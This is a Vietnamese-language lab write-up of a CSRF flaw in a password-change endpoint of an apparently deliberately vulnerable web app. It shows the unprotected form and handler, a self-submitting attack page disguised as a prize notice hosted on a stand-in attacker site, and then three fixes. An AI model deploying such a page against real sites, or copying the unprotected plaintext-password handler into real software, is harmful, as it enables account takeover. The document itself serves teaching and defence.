# CSRF (Cross-Site Request Forgery) — Writeup

> **Mức độ:** High  
> **Vị trí:** `/change-password`  
> **CWE:** CWE-352 — Cross-Site Request Forgery

---

## 1. CSRF là gì?

CSRF xảy ra khi attacker lừa browser của nạn nhân (đang đăng nhập) gửi request đến ứng dụng mà người dùng không biết. Browser tự động đính kèm cookie → server tin đây là request hợp lệ.

---

## 2. Vị trí lỗi

```html
<!-- change-password.ejs -->
<form method="POST" action="/change-password">
  <!-- Không có <input type="hidden" name="csrf_token" value="..."> -->
  <input type="password" name="new_password">
  <button type="submit">Change</button>
</form>
```

```javascript
// server.js
app.post('/change-password', (req, res) => {
  // Không verify CSRF token
  // Không yêu cầu current_password
  db.prepare('UPDATE users SET password = ? WHERE id = ?').run(new_password, userId);
});
```

---

## 3. Tạo CSRF Attack Page

**Tạo file `csrf-attack.html` (hosted trên attacker.com):**

```html
<!DOCTYPE html>
<html>
<head><title>Win a Prize!</title></head>
<body onload="document.forms[0].submit()">
  <h1>🎉 Congratulations! You won!</h1>
  <p>Collecting your prize...</p>
  
  <!-- Form tự submit khi trang load -->
  <form method="POST" action="http://localhost:3000/change-password" style="display:none">
    <input type="hidden" name="new_password" value="hacked_by_attacker">
  </form>
</body>
</html>
```

**Kịch bản tấn công:**
1. Nạn nhân đang đăng nhập VulnWebApp (có session cookie)
2. Nạn nhân click link từ attacker: `http://attacker.com/csrf-attack.html`
3. Trang load → form tự submit đến `localhost:3000/change-password`
4. Browser gửi kèm session cookie của nạn nhân
5. Server đổi password thành `hacked_by_attacker`
6. Nạn nhân bị khóa khỏi account

---

## 4. Cách Fix

### Fix 1: Dùng CSRF Token

```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.get('/change-password', csrfProtection, (req, res) => {
  res.render('change-password', { csrfToken: req.csrfToken() });
});

app.post('/change-password', csrfProtection, (req, res) => {
  // csurf middleware tự verify token — throw error nếu sai
  db.prepare('UPDATE users SET password = ?...').run(...);
});
```

```html
<!-- Trong form: -->
<input type="hidden" name="_csrf" value="<%= csrfToken %>">
```

### Fix 2: SameSite Cookie

```javascript
cookie: { sameSite: 'strict' }
// → Browser không gửi cookie cho cross-site requests
```

### Fix 3: Require current password

```javascript
app.post('/change-password', (req, res) => {
  const { current_password, new_password } = req.body;
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(userId);
  
  // Verify current password
  if (!bcrypt.compareSync(current_password, user.password)) {
    return res.render('change-password', { error: 'Current password incorrect' });
  }
  
  db.prepare('UPDATE users SET password = ? WHERE id = ?')
    .run(bcrypt.hashSync(new_password, 12), userId);
});
```

---

## 5. Tham khảo

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger — CSRF](https://portswigger.net/web-security/csrf)
- [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
